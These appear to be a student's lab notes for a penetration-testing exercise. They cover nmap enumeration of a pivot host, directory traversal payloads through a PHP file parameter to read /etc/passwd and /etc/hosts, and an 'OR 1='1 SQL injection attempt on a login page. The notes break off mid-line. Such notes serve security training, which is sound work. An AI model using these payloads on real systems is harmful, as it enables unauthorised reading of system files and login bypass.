# Start

- ( Your given the pivot ip, you must enumerate from your linops to get access to it)

**Given : 10.50.14.173**

- (from linops)

**nmap (ip) -T5 2>/dev/null**

**nmap -sV --script=http-enum (ip)**

- (will be given a http port and ssh, so you go into the webbrowser and enter ip w/ port)
(in web browser)

ip:port


- (you will perform web exploitation)

**Look at notes for Web Exploitation and Sql**

- (from the http enum, found the pages you should go to w/ ip)

**(there will be a php that looks into files)** 

**Ex: http://ip/getcareers.php?myfile=**

(note: from here after the = you can change dir by "../" and look into other files)

**Ex: http://ip/getcareers.php?myfile=../../../../../etc/passwd** 

**Ex: http://ip/getcareers.php?myfile=../../../../../etc/hosts**

- ( you will try and find the login page and try the 'OR 1='1)

(
